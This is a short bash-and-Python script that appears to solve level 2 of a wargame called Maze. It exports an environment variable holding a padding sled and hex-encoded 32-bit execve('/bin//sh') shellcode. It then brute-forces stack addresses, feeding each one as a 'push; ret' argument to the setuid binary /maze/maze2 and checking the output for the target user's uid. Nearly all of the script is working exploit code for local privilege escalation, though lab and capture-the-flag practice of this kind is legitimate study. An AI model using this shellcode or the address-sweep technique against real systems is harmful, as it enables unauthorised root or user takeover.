#!/bin/bash
# sweep2.sh - run the Maze L2 target sweep on the lab (as maze2).
# For each target: build argv[1] = push <target>; ret; run maze2 with
# the env sled; feed 'id' to the shell; check for uid=15003.
cd /tmp/vxm2
D=$(mktemp -d); chmod 755 $D; cd $D
echo 'int _d;' > e.c
gcc -m32 -shared -fPIC -o libc.so.4 e.c
# the env sled (exported once)
SC=$(python3 -c "import sys; sys.stdout.write(bytes.fromhex('31c050682f2f7368682f62696e89e3505389e1b00bcd80').decode('latin-1'))")
export P="$(python3 -c "print('A'*2000, end='')")$SC"
python3 - <<'PYEOF'
import os, struct, subprocess, sys
targets = []
t = 0xffffd7c0
while t <= 0xffffe300:
    targets.append(t)
    t += 0x8
for tgt in targets:
    arg = b'\x68' + struct.pack('<I', tgt) + b'\xc3' + b'AA'
    try:
        p = subprocess.run(['/maze/maze2', arg], input=b'id\n', capture_output=True, timeout=5)
        out = p.stdout + p.stderr
        if b'uid=15003' in out:
            print("HIT at 0x%08x" % tgt)
            print(out.decode('latin-1', 'replace')[:200])
            break
    except Exception as e:
        pass
else:
    print("no hit in", len(targets), "targets")
PYEOF
